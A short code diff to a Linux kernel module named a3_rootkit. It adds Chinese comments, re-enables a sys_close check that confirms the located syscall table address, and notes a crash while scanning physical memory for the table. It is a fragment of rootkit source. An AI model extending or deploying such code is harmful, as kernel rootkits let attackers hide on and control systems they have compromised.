@@ -33,8 +33,8 @@ static int major_num;
 static struct class *module_class;
 static struct device *module_device;
 
-size_t* syscall_table = NULL;
-size_t syscall_table_data[4];
+size_t* syscall_table = NULL;//用于保存syscall table地址的变量
+size_t syscall_table_data[4];//用户态和内核态之间传输的结构体
 int get_syscall_table_data = 0;
 
 static int a3_rootkit_open(struct inode *, struct file *);
@@ -63,7 +63,7 @@ static unsigned long **acquire_sys_call_table(void)
     {
     	sct = (unsigned long **)offset;
 
-    	//if (sct[__NR_close] == (unsigned long *)sys_close)
+    	if (sct[__NR_close] == (unsigned long *)sys_close)
         {
             printk(KERN_INFO "sys call table found: %p\n", (void*)sct);
     		return sct;
@@ -101,6 +101,7 @@ void a3_rootkit_find_syscall_table(void)
     printk("syscall_table_data is not empty");
     for (size_t i = 0; 1; i++) {
         /* we only need to compare some of that */
+        //Bug:在这行一直出错，是内核访问了不能读写的内存地址（我猜测的）
         if (phys_mem[i] == syscall_table_data[0]
             && phys_mem[i + 1] == syscall_table_data[1]
             && phys_mem[i + 2] == syscall_table_data[2]
